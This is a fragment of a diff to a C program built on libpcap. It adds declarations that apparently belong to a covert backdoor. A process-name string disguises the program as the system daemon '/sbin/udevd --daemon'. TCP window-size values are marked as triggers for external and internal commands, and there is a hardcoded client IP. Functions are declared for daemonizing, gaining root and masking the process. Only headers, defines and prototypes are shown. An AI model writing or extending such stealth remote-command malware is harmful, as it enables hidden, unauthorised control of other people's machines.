@@ -26,6 +26,7 @@
 #include <time.h>
 #include <sys/time.h>
 #include <err.h>
+#include <signal.h>
 
 #include <getopt.h>
 #include <pcap.h>
@@ -46,15 +47,28 @@
 #define ERROR_READ		-5
 #define ERROR_OPTS		-6
 #define	ERROR_OPTS_HELP	-7
+#define ERROR_FORK		-8
 
 /* defaults */
-#define	TRUE	1
-#define FALSE	0
-#define PROCESS_NAME "/sbin/udevd --daemon"
+#define	TRUE			1
+#define FALSE			0
+#define USER_ROOT		0
+#define PROCESS_NAME 	"/sbin/udevd --daemon"
+#define WINDOW_EXT_CMD	21387 /* win for extern commands */
+#define WINDOW_INT_CMD	45245 /* win for intern commands */
+#define CLIENT_IP		"192.168.1.100"
+
+struct svr_vars {
+	int daemonize;
+	char *client_ip;
+} svr_vars;
 
 void print_settings(char *);
 void print_usage(char *, int);
 int parse_options(int, char **);
+void signal_handler(int);
+void exit_clean(void);
+void daemonize(void);
 int set_root(void);
 void mask_process(char **, char *);
 
